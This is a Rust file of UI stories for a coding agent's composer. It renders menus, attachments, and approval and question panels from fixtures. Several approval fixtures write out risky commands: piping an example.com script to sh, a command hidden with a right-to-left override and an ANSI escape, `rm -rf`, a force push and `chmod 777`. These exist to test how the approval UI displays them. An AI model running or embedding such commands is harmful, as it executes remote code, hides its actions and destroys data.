//! Stories of the composer (CP5.1): the idle card, one with text, the input grown to its maximum
//! (and scrolling), a running turn (the Stop button and the context meter), the queue above the
//! card, the model and effort picker, the permissions menu and the new-thread screen. t3code's two
//! themes; the references are named in `thread/composer/view.rs` (`app-thread-dark.png`,
//! `app-empty-dark.png`, `composer-model-picker.png`, `composer-model-picker-permission.png`).
//!
//! CP5.2 adds `composer-mentions` (the `@` drawer, chips in the text), `composer-commands` (the `/`
//! drawer, an argument hint, a command's answer in the timeline) and `composer-attachments` (the
//! strip: images, files, many, a narrow card); t3code's `ComposerCommandMenu.tsx` and
//! `ComposerAttachmentStrip.tsx` (no capture of them is in `reference/t3code/`).
//!
//! The views live in the story window's element state (`use_keyed_state`), so the controls read
//! and the model list survive the frames the harness draws.

use gpui_kit::{
    AnyElement, App, AppContext as _, InteractiveElement as _, IntoElement, ParentElement as _,
    Styled as _, Window, div, px,
};

use super::{Interaction, State, Story, Themes};
use crate::{
    dev::ProbeExt as _,
    model::{FixtureBackend, fixture},
    theme::DesignTheme as _,
    thread::composer::{
        ComposerModel, ComposerView, Menu, Target,
        data::{Controls, Mode, QueuedItem},
        view::hero,
    },
};

const fn at_rest(name: &'static str) -> State {
    State {
        name,
        interaction: Interaction::None,
    }
}

const STATES: [State; 5] = [
    at_rest("idle"),
    at_rest("typed"),
    at_rest("grown"),
    at_rest("running"),
    at_rest("queued"),
];

const MENU_STATES: [State; 3] = [
    at_rest("model-picker"),
    at_rest("mode-menu"),
    at_rest("narrow"),
];

const NEW_STATES: [State; 1] = [at_rest("new-thread")];

const TEXT: &str = "Add a retry button to the turn footer and keep it disabled while a turn runs.";

fn long_text() -> String {
    (1..=14)
        .map(|n| format!("Line {n} of a long message the input has to scroll."))
        .collect::<Vec<_>>()
        .join("\n")
}

fn queued(text: &str, n: usize) -> QueuedItem {
    QueuedItem {
        id: format!("q{n}"),
        text: text.into(),
        shown: false,
    }
}

/// The frame a state is drawn in: its width and height, in logical pixels.
fn frame_size(name: &str) -> (f32, f32) {
    match name {
        "grown" => (720., 330.),
        "queued" => (720., 300.),
        "model-picker" => (720., 480.),
        "mode-menu" => (720., 280.),
        "narrow" => (352., 150.),
        "new-thread" => (720., 420.),
        _ => (720., 150.),
    }
}

fn cell(state: &State, window: &mut Window, cx: &mut App) -> AnyElement {
    let name = state.name;
    let palette = cx.design_theme().palette;
    let view = window.use_keyed_state(
        gpui_kit::ElementId::Name(format!("composer-story-{name}").into()),
        cx,
        |window, cx| {
            let backend = FixtureBackend::new(fixture::snapshot());
            let controls = |f: &dyn Fn(&mut Controls)| {
                let mut c = FixtureBackend::default_controls();
                f(&mut c);
                c
            };
            let draft = name == "new-thread";
            match name {
                "running" => backend.set_controls(
                    "t1",
                    controls(&|c| {
                        c.running = true;
                        c.context = Some((18_000, 200_000));
                    }),
                ),
                "queued" => backend.set_controls(
                    "t1",
                    controls(&|c| {
                        c.running = true;
                        c.context = Some((18_000, 200_000));
                        c.queue = vec![
                            queued("Then run the tests", 1),
                            queued(
                                "And update the changelog with what changed in the footer",
                                2,
                            ),
                            queued("Finally, bump the version", 3),
                        ];
                    }),
                ),
                "model-picker" => backend.set_controls(
                    "t1",
                    controls(&|c| {
                        c.effort = "minimal".into();
                        c.context = Some((18_000, 200_000));
                    }),
                ),
                "mode-menu" => {
                    backend.set_controls("t1", controls(&|c| c.mode = Mode::AcceptEdits))
                }
                "narrow" => backend.set_controls(
                    "t1",
                    controls(&|c| {
                        c.model = "openrouter/aion-labs/aion-rp-llama-3.1-8b".into();
                        c.context = Some((150_000, 200_000));
                    }),
                ),
                _ => {}
            }
            let target = if draft {
                Target::Draft("prj_structure".into())
            } else {
                Target::Thread("t1".into())
            };
            let model = cx.new(|cx| ComposerModel::new(target, backend, None, cx));
            let text = match name {
                "typed" => Some(TEXT.to_string()),
                "grown" => Some(long_text()),
                "queued" => Some("Also mention it in the docs".to_string()),
                _ => None,
            };
            let key = if draft { "new:prj_structure" } else { "t1" };
            let view = ComposerView::new(model, key.to_string(), text, window, cx);
            match name {
                "model-picker" => {
                    let model = view.model().clone();
                    model.update(cx, |m, cx| m.load_choices(cx));
                }
                _ => {}
            }
            view
        },
    );
    match name {
        "model-picker" => {
            let opened = window.use_keyed_state("composer-story-opened", cx, |_, _| false);
            if !*opened.read(cx) {
                opened.update(cx, |o, _| *o = true);
                view.update(cx, |v, cx| v.toggle_menu(Menu::Model, window, cx));
            }
        }
        "mode-menu" => {
            let opened = window.use_keyed_state("composer-story-opened-mode", cx, |_, _| false);
            if !*opened.read(cx) {
                opened.update(cx, |o, _| *o = true);
                view.update(cx, |v, cx| v.toggle_menu(Menu::Mode, window, cx));
            }
        }
        _ => {}
    }
    let (w, h) = frame_size(name);
    let body: AnyElement = if name == "new-thread" {
        hero(
            &palette,
            "What should we build in structure?".into(),
            None,
            Some(view),
        )
    } else {
        div()
            .size_full()
            .flex()
            .flex_col()
            .justify_end()
            .child(view)
            .into_any_element()
    };
    div()
        .id("composer-frame")
        .w(px(w))
        .h(px(h))
        .flex()
        .flex_col()
        .bg(palette.background.hsla())
        .child(body)
        .probe()
        .into_any_element()
}

/// The card in its states: idle, with text, grown to its maximum, a running turn, a queue.
pub static COMPOSER: Story = Story {
    name: "composer",
    title: "Composer: states",
    size: (760., 600.),
    themes: Themes::T3,
    states: &STATES,
    render: cell,
};

/// The model and effort picker, the permissions menu and a narrow card.
pub static COMPOSER_MENUS: Story = Story {
    name: "composer-menus",
    title: "Composer: menus",
    size: (760., 600.),
    themes: Themes::T3,
    states: &MENU_STATES,
    render: cell,
};

/// The new-thread screen.
pub static COMPOSER_NEW: Story = Story {
    name: "composer-new",
    title: "Composer: new thread",
    size: (760., 600.),
    themes: Themes::T3,
    states: &NEW_STATES,
    render: cell,
};

// --- CP5.2 -----------------------------------------------------------------------------------------

const MENTION_STATES: [State; 3] = [at_rest("at-menu"), at_rest("chips"), at_rest("chips-narrow")];
const COMMAND_STATES: [State; 3] = [
    at_rest("slash-menu"),
    at_rest("arguments"),
    at_rest("local-answer"),
];
const ATTACH_STATES: [State; 4] = [
    at_rest("images"),
    at_rest("files"),
    at_rest("many"),
    at_rest("narrow"),
];

fn prepared(
    name: &str,
    size: usize,
    kind: crate::thread::composer::attach::Kind,
    shade: u8,
) -> crate::thread::composer::attach::Prepared {
    use crate::thread::composer::attach::{Kind, Prepared, Source, sample_png};
    let thumb = (kind == Kind::Image).then(|| std::sync::Arc::new(sample_png(96, 72, shade)));
    Prepared {
        name: name.to_string(),
        size,
        kind,
        source: Source::Bytes {
            data: std::sync::Arc::new(vec![shade]),
            mime: "image/png".into(),
        },
        thumb,
        key: format!("{name}-{shade}"),
    }
}

fn cell_cp52(state: &State, window: &mut Window, cx: &mut App) -> AnyElement {
    use crate::thread::composer::attach::Kind;
    let name = state.name;
    let palette = cx.design_theme().palette;
    let (view, thread) = window
        .use_keyed_state(
            gpui_kit::ElementId::Name(format!("composer52-story-{name}").into()),
            cx,
            |window, cx| {
                let backend = FixtureBackend::new(fixture::snapshot());
                let thread_model = (name == "local-answer").then(|| {
                    cx.new(|cx| {
                        let mut t = crate::thread::ThreadModel::new("t1", backend.clone(), cx)
                            .with_clock(|| fixture::NOW_MS);
                        t.show_command_note(
                            "/usage",
                            "Session usage\n  input tokens     12,345\n  output tokens     1,234\n  cost            $0.0123",
                            cx,
                        );
                        t
                    })
                });
                let model = {
                    let (b, t) = (backend.clone(), thread_model.clone());
                    cx.new(|cx| ComposerModel::new(Target::Thread("t1".into()), b, t, cx))
                };
                let text = match name {
                    "at-menu" => Some("Look at @ma".to_string()),
                    "chips" | "chips-narrow" => Some(
                        "Compare @file:src/main.rs with @file:crates/native/src/thread/composer/view.rs and @folder:docs/ please"
                            .to_string(),
                    ),
                    "slash-menu" => Some("/in".to_string()),
                    "arguments" => Some("/diff ".to_string()),
                    "images" => Some("What is wrong in these screenshots?".to_string()),
                    _ => None,
                };
                let view =
                    cx.new(|cx| ComposerView::new(model.clone(), "t1".into(), text, window, cx));
                let seeded = match name {
                    "images" => vec![
                        prepared("one.png", 245_000, Kind::Image, 40),
                        prepared("two.png", 1_200_000, Kind::Image, 120),
                        prepared("three.png", 90_000, Kind::Image, 200),
                    ],
                    "files" => vec![
                        prepared("shot.png", 245_000, Kind::Image, 90),
                        prepared("error.log", 12_800, Kind::File, 1),
                        prepared(
                            "a-rather-long-file-name-for-the-design-review-notes-final-v2.md",
                            4_096,
                            Kind::File,
                            2,
                        ),
                    ],
                    "many" => (0..12u8)
                        .map(|n| prepared(&format!("image-{n}.png"), 50_000, Kind::Image, n * 18))
                        .chain((0..4u8).map(|n| {
                            prepared(&format!("notes-{n}.txt"), 2_000, Kind::File, 100 + n)
                        }))
                        .collect(),
                    "narrow" => vec![
                        prepared("a.png", 245_000, Kind::Image, 60),
                        prepared(
                            "a-name-that-is-far-too-long-for-a-narrow-card.pdf",
                            3_145_728,
                            Kind::File,
                            3,
                        ),
                    ],
                    _ => Vec::new(),
                };
                if !seeded.is_empty() {
                    model.update(cx, |m, cx| m.seed_attachments(seeded, cx));
                }
                let thread_view = thread_model
                    .map(|t| cx.new(|cx| crate::thread::ThreadView::new(t, None, window, cx)));
                (view, thread_view)
            },
        )
        .read(cx)
        .clone();
    if matches!(name, "at-menu" | "slash-menu" | "arguments") {
        let opened = window.use_keyed_state("composer52-opened", cx, |_, _| false);
        if !*opened.read(cx) {
            opened.update(cx, |o, _| *o = true);
            view.update(cx, |v, cx| v.caret_to_end(cx));
        }
    }
    let (w, h) = match name {
        "at-menu" => (720., 420.),
        "chips" => (720., 200.),
        "chips-narrow" => (352., 260.),
        "slash-menu" => (720., 420.),
        "arguments" => (720., 220.),
        "local-answer" => (720., 380.),
        "images" => (720., 240.),
        "files" => (720., 310.),
        "many" => (720., 340.),
        _ => (352., 290.),
    };
    let w = if name == "chips-narrow" || name == "narrow" { 352. } else { w };
    div()
        .id("composer-frame")
        .w(px(w))
        .h(px(h))
        .flex()
        .flex_col()
        .justify_end()
        .bg(palette.background.hsla())
        .children(thread.map(|t| div().flex_1().min_h_0().child(t)))
        .child(view)
        .probe()
        .into_any_element()
}

macro_rules! cp52_story {
    ($name:ident, $id:literal, $title:literal, $states:ident, $size:expr) => {
        pub static $name: Story = Story {
            name: $id,
            title: $title,
            size: $size,
            themes: Themes::T3,
            states: &$states,
            render: cell_cp52,
        };
    };
}

cp52_story!(COMPOSER_MENTIONS, "composer-mentions", "Composer: @ menu and chips", MENTION_STATES, (760., 470.));
cp52_story!(COMPOSER_COMMANDS, "composer-commands", "Composer: / menu and answers", COMMAND_STATES, (760., 470.));
cp52_story!(COMPOSER_ATTACHMENTS, "composer-attachments", "Composer: attachments", ATTACH_STATES, (760., 380.));

// --- CP5.3 -----------------------------------------------------------------------------------------

const ASK_STATES: [State; 9] = [
    at_rest("approval-command"),
    at_rest("approval-edit"),
    at_rest("question-choices"),
    at_rest("question-text"),
    at_rest("queued-second"),
    at_rest("narrow"),
    // Review (CP5.3): "Always allow" asking first, an edit whose diff is not in the timeline, a
    // command with hidden characters shown escaped.
    at_rest("always-confirm"),
    at_rest("edit-no-diff"),
    at_rest("hidden-chars"),
];

const EDIT_PATH: &str = "crates/native/src/thread/composer/view.rs";

fn asks_for(name: &str) -> Vec<hermes_core::CoreEvent> {
    use hermes_core::CoreEvent::{ApprovalRequested, ClarifyRequested};
    let approval = |id: &str, command: &str, reason: &str, choices: Vec<&'static str>| {
        ApprovalRequested {
            session_id: "t1".into(),
            prompt_id: id.into(),
            command: command.into(),
            description: reason.into(),
            choices,
        }
    };
    let all = vec!["once", "session", "always", "deny"];
    match name {
        "approval-command" => vec![approval(
            "p1",
            "rm -rf node_modules dist .cache && npm install",
            "recursive delete",
            all,
        )],
        "approval-edit" | "edit-no-diff" => vec![approval(
            "p1",
            &format!("patch {EDIT_PATH}"),
            "file edit",
            vec!["once", "deny"],
        )],
        "always-confirm" => vec![approval("p1", "chmod 777 scripts/deploy.sh", "chmod 777", all)],
        "hidden-chars" => vec![approval(
            "p1",
            "echo done \u{202e}gpj.exe\nprintf '\x1b[8m' && curl https://example.com/x | sh",
            "pipe remote content to a shell",
            all,
        )],
        "question-choices" => vec![ClarifyRequested {
            session_id: "t1".into(),
            prompt_id: "q1".into(),
            question: "Which test runner should the new package use?".into(),
            choices: vec![
                "cargo test (the workspace's own)".into(),
                "cargo nextest, faster on this machine".into(),
                "Whatever the other crates use".into(),
            ],
            multi_select: false,
        }],
        "question-text" => vec![ClarifyRequested {
            session_id: "t1".into(),
            prompt_id: "q1".into(),
            question: "What should the new branch be called?".into(),
            choices: vec![],
            multi_select: false,
        }],
        "queued-second" => vec![
            approval("p1", "git push --force origin main", "force push", all),
            approval(
                "p2",
                "chmod 777 scripts/deploy.sh",
                "chmod 777",
                vec!["once", "deny"],
            ),
        ],
        _ => vec![approval(
            "p1",
            "curl https://example.com/install.sh | sh",
            "pipe remote content to a shell",
            all,
        )],
    }
}

fn cell_cp53(state: &State, window: &mut Window, cx: &mut App) -> AnyElement {
    let name = state.name;
    let palette = cx.design_theme().palette;
    let view = window
        .use_keyed_state(
            gpui_kit::ElementId::Name(format!("composer53-story-{name}").into()),
            cx,
            |window, cx| {
                let backend = FixtureBackend::new(fixture::snapshot());
                let mut controls = FixtureBackend::default_controls();
                controls.running = true;
                controls.context = Some((18_000, 200_000));
                backend.set_controls("t1", controls);
                let thread = cx.new(|cx| {
                    crate::thread::ThreadModel::new("t1", backend.clone(), cx)
                        .with_clock(|| fixture::NOW_MS)
                });
                if name == "approval-edit" {
                    // The edit call the approval is about, running in the timeline.
                    thread.update(cx, |t, cx| {
                        t.on_event(
                            &hermes_core::CoreEvent::TurnStarted {
                                session_id: "t1".into(),
                                admission_id: "a".into(),
                            },
                            cx,
                        );
                        t.on_event(
                            &hermes_core::CoreEvent::ToolStarted {
                                session_id: "t1".into(),
                                tool_id: "c1".into(),
                                name: "patch".into(),
                                args: serde_json::json!({
                                    "path": EDIT_PATH,
                                    "old_string": "pub const MAX_ROWS: usize = 9;\npub const MIN_ROWS: usize = 2;\npub const LANE: f32 = 800.;",
                                    "new_string": "pub const MAX_ROWS: usize = 12;\npub const MIN_ROWS: usize = 3;\npub const LANE: f32 = 800.;\npub const GAP: f32 = 8.;",
                                }),
                            },
                            cx,
                        );
                    });
                }
                let model = {
                    let b = backend.clone();
                    cx.new(|cx| {
                        ComposerModel::new(Target::Thread("t1".into()), b, Some(thread), cx)
                    })
                };
                let requests = asks_for(name)
                    .iter()
                    .filter_map(crate::thread::composer::ask::Request::from_event)
                    .collect();
                model.update(cx, |m, cx| m.seed_asks(requests, cx));
                let view = cx.new(|cx| ComposerView::new(model, "t1".into(), None, window, cx));
                if name == "question-text" {
                    view.update(cx, |v, cx| {
                        v.set_answer_text("feature/approvals-and-questions", window, cx)
                    });
                }
                if name == "always-confirm" {
                    view.update(cx, |v, cx| {
                        v.choose(crate::thread::composer::ask::Choice::Always, window, cx)
                    });
                }
                view
            },
        )
        .read(cx)
        .clone();
    let (w, h) = match name {
        "approval-command" => (720., 320.),
        "approval-edit" => (720., 440.),
        "question-choices" => (720., 430.),
        "question-text" => (720., 330.),
        "queued-second" => (720., 320.),
        "always-confirm" | "edit-no-diff" => (720., 320.),
        "hidden-chars" => (720., 360.),
        _ => (352., 430.),
    };
    div()
        .id("composer-frame")
        .w(px(w))
        .h(px(h))
        .flex()
        .flex_col()
        .justify_end()
        .bg(palette.background.hsla())
        .child(view)
        .probe()
        .into_any_element()
}

/// The panel above the card when the agent waits for the user: an approval of a command and of an
/// edit (with its diff), a question with choices and one with a free-text answer, a second
/// request queued behind the first, and a narrow card.
pub static COMPOSER_ASKS: Story = Story {
    name: "composer-asks",
    title: "Composer: approvals and questions",
    size: (760., 480.),
    themes: Themes::T3,
    states: &ASK_STATES,
    render: cell_cp53,
};
